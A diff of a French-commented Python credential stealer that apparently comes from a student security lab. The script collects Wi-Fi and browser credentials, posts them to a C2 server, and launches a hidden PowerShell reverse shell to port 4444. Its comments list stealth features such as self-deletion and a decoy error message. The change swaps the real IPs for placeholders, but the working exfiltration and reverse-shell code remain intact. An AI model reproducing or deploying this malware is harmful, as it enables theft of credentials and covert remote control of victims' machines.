@@ -5,6 +5,7 @@
 # 4. Furtivité ajoutée : Délai random, exécution sans pop-up, suppression du script après run, faux message d'erreur pour distraire l'utilisateur.
 # 5. Originalité : Ajout d'un 'reverse shell' simple (cmd.exe redirigé vers C2) pour contrôle distant basique.
 # 6. Tester uniquement dans VM isolée (Windows victime).
+# 7. Adaptation : IP C2 mise à jour pour un placeholder - remplace par l'IP réelle de ta VM Kali (ex. 192.168.109.128 ou celle actuelle).
 # Matricules: [INSÉRER TES MATRICULES ICI]
 
 import subprocess
@@ -55,9 +56,9 @@ def get_browser_creds():
 
 # Étape 3: Envoyer à C2 (furtif : pas de print sauf erreur debug)
 def send_to_c2(data):
-    c2_url = "http://192.168.2.154:8080"  # Adapte à l'IP de Kali
+    c2_url = "http://[IP_DE_TA_VM_KALI]:8080"  # Adapte ici à l'IP réelle de Kali (ex. 192.168.109.128)
     try:
-        requests.post(c2_url, json=data, timeout=5)
+        requests.post(c2_url, json=data, timeout=10)  # Augmenté timeout à 10s pour réseaux lents
     except:
         pass  # Silencieux pour furtivité
 
@@ -65,9 +66,9 @@ def send_to_c2(data):
 def open_reverse_shell():
     try:
         # Lance cmd.exe en arrière-plan et redirige vers un port C2 (ex. netcat listener sur Kali)
-        # Note : Nécessite netcat ou similaire sur C2. Ici, exemple avec telnet ou powershell.
+        # Note : Nécessite netcat ou similaire sur C2. Ici, exemple avec powershell.
         subprocess.Popen(['powershell', '-NoP', '-NonI', '-W', 'Hidden', '-Exec', 'Bypass', 
-                          '$client = New-Object System.Net.Sockets.TCPClient("192.168.2.154", 4444);' 
+                          '$client = New-Object System.Net.Sockets.TCPClient("[IP_DE_TA_VM_KALI]", 4444);' 
                           '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;' 
                           '$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );' 
                           '$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'])
@@ -82,7 +83,7 @@ if __name__ == "__main__":
     
     wifi_data = get_wifi_creds()
     browser_data = get_browser_creds()
-    payload = {"wifi": wifi_data, "browser": browser_data, "matricules": "[TES_MATRICULES]", "victim_ip": "192.168.2.155"}
+    payload = {"wifi": wifi_data, "browser": browser_data, "matricules": "[TES_MATRICULES]", "victim_ip": "[IP_DE_TA_VM_WINDOWS]"}
     send_to_c2(payload)
     
     open_reverse_shell()  # Originalité : Ajout du reverse shell
